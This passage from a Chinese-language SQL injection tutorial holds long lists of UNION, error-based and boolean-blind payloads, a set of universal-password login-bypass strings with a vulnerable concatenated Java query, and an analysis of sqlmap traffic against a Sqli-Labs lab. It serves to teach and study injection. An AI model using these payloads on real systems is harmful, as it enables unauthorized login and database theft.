 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))-- 
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- 
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- 
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- 
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))-- 
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))-- 
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))-- 
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))-- 
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))-- 
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))-- 
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))-- 
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))-- 
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))-- 
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))-- 
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))-- 
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))-- 
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))-- 
 UNION ALL SELECT NULL#
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))#
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))#
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))#
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))#
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))#
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))#
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))#
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))#
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))#
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))#
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))#
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))#
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))#
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))#
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))#
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))#
 UNION ALL SELECT NULL 
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))
 AND 5650=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))
 AND 3516=CAST((CHR(113)||CHR(106)||CHR(122)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (3516=3516) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(106)||CHR(107)||CHR(113)) AS NUMERIC)
 AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
 UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL-- 
 UNION ALL SELECT 'INJ'||'ECT'||'XXX'
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30
 UNION ALL SELECT 'INJ'||'ECT'||'XXX'-- 
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2-- 
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3-- 
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4-- 
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5-- 
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6-- 
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7-- 
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8-- 
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9-- 
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10-- 
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11-- 
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12-- 
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13-- 
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14-- 
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15-- 
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- 
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- 
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- 
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- 
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- 
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- 
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- 
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- 
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- 
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- 
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- 
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- 
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- 
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- 
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- 
 UNION ALL SELECT 'INJ'||'ECT'||'XXX'#
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2#
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3#
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4#
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5#
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6#
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7#
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9#
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10#
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11#
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12#
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13#
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15#
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#
```


## 2.6、万能密码
设现在有一个SQL语句：
```
String sql = "select count(*) from admin where username = '" + admin.getUsername()+"' and password = '"admin.gitPassword() + "'";
```

当我们输入`' or 1=1--`得到
```
select count(*) from admin where username = '' or 1=1--' and password = ''
```

实际执行得SQL语句为：
```
select count(*) from admin where username = '' or 1=1
```
这里password就起不到作用了，因为它被注释掉了，而且`username = '' or 1=1`永远为真，所以就可以绕过账号和密码，实现登录。

**类似的Payload有：**
```
'-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
```


# 三、SQLMAP检测过程分析

## 3.1、环境准备
**靶机IP：**192.168.10.3<br />**靶场：**Sqli-Labs<br />这里选择Sqli-Labs是因为在Sqli-Labs的每一个关卡里面有一个result.txt的文件会记录攻击的sql语句，方便我们分析。


## 3.2、数据库探测
首先输入命令
```
python sqlmap.py -u "http://192.168.10.3/sql/Less-1/?id=1"
```

**分析**<br />1、SQLMAP发出三个同样的Payload：
```
ID:1
ID:1
ID:1
```
测试与目标URL的连接并且检测目标是否受到某种WAF/IPS的保护和测试目标URL内容是否稳定，最后得出结论目标URL内容稳定
![image.png](_img/02-Web安全/01-基础知识/1664413975465-fb8885ed-3ecf-408f-a6bb-05bea23854c7.png)

2、SQLMAP发出Payload：
```
ID:1364
```
测试GET参数“id”是否是动态的，得出结论获取参数“id”似乎是动态的
![image.png](_img/02-Web安全/01-基础知识/1664414068657-6ea6545c-7e7b-42d4-a6f1-aff11e9a9812.png)
这里是根据`ID:1`和`ID:1364`对比返回的页面是否相同来判断id”是否为动态

3、SQLMAP发出Payload：
```
ID:1,((',",,.,
```
判断出GET参数“id”可能是可注入的（可能的DBMS:“MySQL”）并且表明GET参数“id”可能容易受到跨站点脚本（XSS）
![image.png](_img/02-Web安全/01-基础知识/1664414642770-8fe626ac-c2cb-40c1-adee-c63dae9ea298.png)
这里是根据数据库报错的信息来判断数据库的类型

4、SQLMAP发出Payload：
```
id=1'yIfxiM<'">zwROWb
```
测试GET参数“id”上的SQL注入并最终确定后端DBMS似乎是“MySQL”。询问我们是否要跳过特定于其他DBMS的测试有效负载？以及对于其余的测试，是否要包括“MySQL”扩展提供的级别1和风险1值的所有测试？
![image.png](_img/02-Web安全/01-基础知识/1664416149493-fa819930-a42e-4767-b148-40a9a1858fb0.png)
这里同上面一样也是根据数据库报错的信息来进一步确定数据库的类型

## 3.3、注入分析
在确定跳过特定于其他DBMS的测试有效负载和对于其余的测试，要包括“MySQL”扩展提供的级别1和风险1值的所有测试后

1、SQLMAP发出Payload：
```
ID:1) AND 7523=1894 AND (6339=6339
ID:1) AND 6912=6912 AND (3931=3931
ID:1 AND 4310=2361
ID:1 AND 6912=6912
ID:1 AND 5260=3060-- szkX
ID:1 AND 6912=6912-- SOAv
ID:1') AND 2542=9651 AND ('tYjt'='tYjt
ID:1') AND 6912=6912 AND ('fZry'='fZry
ID:1' AND 8860=5822 AND 'ZHsk'='ZHsk
ID:1' AND 6912=6912 AND 'DcLm'='DcLm
ID:1' AND 9779=3518 AND 'DBdw'='DBdw
```
测试基于AND布尔值的盲注WHERE或HAVING字句，输出警告找到反射值并过滤掉，最终得到结论GET参数“id”似乎是“AND boolean based blind-WHERE or HAVING clause”可注入
![image.png](_img/02-Web安全/01-基础知识/1664418108657-d9139525-0400-4af5-af82-06bd65ca0cd8.png)
这里是通过

- `1' AND 8860=5822 AND 'ZHsk'='ZHsk`，`8860=5822`为假，页面返回错误
- `1' AND 6912=6912 AND 'DcLm'='DcLm`，`6912=6912`为真，页面返回正确
- `1' AND 9779=3518 AND 'DBdw'='DBdw`，`9779=3518`为假，页面返回错误

来判断出存在布尔盲注。

2、SQLMAP发出Payload：
```
ID:(SELECT CONCAT(CONCAT(0x7178627171,(CASE WHEN (1197=1197) THEN 0x31 ELSE 0x30 END)),0x717a627171))
ID:1' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7178627171,(SELECT (ELT(3459=3459,1))),0x717a627171,0x78))s), 8446744073709551610, 8446744073709551610))) AND 'FeUi'='FeUi
ID:1' OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7178627171,(SELECT (ELT(5686=5686,1))),0x717a627171,0x78))s), 8446744073709551610, 8446744073709551610))) AND 'ZLmB'='ZLmB
ID:1' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7178627171,(SELECT (ELT(1200=1200,1))),0x717a627171,0x78))x)) AND 'ZkWZ'='ZkWZ
ID:1' OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7178627171,(SELECT (ELT(1321=1321,1))),0x717a627171,0x78))x)) AND 'mJtn'='mJtn
ID:1' AND GTID_SUBSET(CONCAT(0x7178627171,(SELECT (ELT(2691=2691,1))),0x717a627171),2691) AND 'dqhD'='dqhD
```
测试“通用内联查询”，分别测试了

- MySQL>=5.5 AND error based-WHERE、HAVING、ORDER BY或GROUP BY子句（BIGINT UNSIGNED）
- MySQL>=5.5 OR error based-WHERE或HAVING子句（BIGINT UNSIGNED）
- MySQL>=5.5 AND error based-WHERE、HAVING、ORDER BY或GROUP BY子句（EXP）
